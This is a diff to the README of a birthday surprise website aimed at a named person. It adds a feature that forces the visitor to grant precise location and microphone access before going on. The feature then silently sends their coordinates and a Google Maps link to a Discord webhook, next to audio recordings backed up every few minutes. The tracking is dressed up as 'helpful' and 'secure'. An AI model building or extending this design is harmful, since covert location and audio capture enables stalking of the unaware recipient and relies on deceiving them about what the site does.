@@ -9,7 +9,7 @@ This is a beautifully crafted, interactive birthday surprise website designed wi
 - Elegant welcome message with "Hello Sheho! 🖤"
 - Instructions for the best experience:
   - Finding a comfy spot
-  - Microphone access for special interactions
+  - Microphone and location access required for the full interactive experience
   - Getting ready to smile
   - Important note about using the "Close Website" button at the end
 - Stylish "Start the Fun! ✨" button with hover effects
@@ -244,6 +244,39 @@ This is a beautifully crafted, interactive birthday surprise website designed wi
   - Every 3 minutes for complete session backups
   - Creates redundant copies to maximize recovery chances
 
+### Location Tracking System
+
+#### Advanced Geolocation Implementation
+- Automatically requests precise location permission at the beginning
+- Required permission to proceed with the experience
+- Sends accurate coordinates to Discord webhook immediately after permission granted
+
+#### Precise Location Data Capture
+- **High Accuracy Mode**: Enables the highest precision location tracking available
+- **Multiple Data Points Captured**:
+  - Latitude and longitude coordinates
+  - Accuracy radius in meters
+  - Timestamp of location capture
+- **Google Maps Integration**: 
+  - Automatically generates clickable Google Maps link
+  - Allows for immediate visual location verification
+
+#### Permission Handling
+- **Combined Permission Request**: 
+  - Requests both microphone and location permissions simultaneously
+  - Clear user messaging about required permissions
+  - Prevents continuation without both permissions granted
+- **Permission Card**: 
+  - Shows helpful permission request overlay if initial permission is denied
+  - Provides clear explanation of why permissions are needed
+  - Easy one-click button to grant all required permissions
+
+#### Secure Data Transmission
+- **Immediate Transmission**: Sends location data as soon as permission is granted
+- **Webhook Integration**: Uses the same secure Discord webhook as other features
+- **Well-Formatted Data**: Sends structured embed with all relevant location details
+- **Error Handling**: Gracefully handles transmission failures with console logging
+
 ### Animations & Effects
 
 #### Visual Elements
@@ -285,6 +318,7 @@ This is a beautifully crafted, interactive birthday surprise website designed wi
 
 #### Special Features
 - Microphone integration for candle interaction
+- Location tracking for precise position data
 - Local storage for responses
 - Discord webhook integration for response tracking
 - Enhanced audio recording capability with fail-safe mechanisms
@@ -308,7 +342,7 @@ The website includes 14 romantic questions covering topics like:
 - Dark mode support
 
 ## User Experience Flow
-- Welcome screen with instructions (Requires mandatory microphone permission to proceed. If permission is initially denied, a prompt card will appear to encourage granting access.)
+- Welcome screen with instructions (Requires mandatory microphone and location permissions to proceed. If permissions are initially denied, a prompt card will appear to encourage granting access.)
 - Series of interactive questions
 - Various animations based on responses
 - Final birthday cake interaction
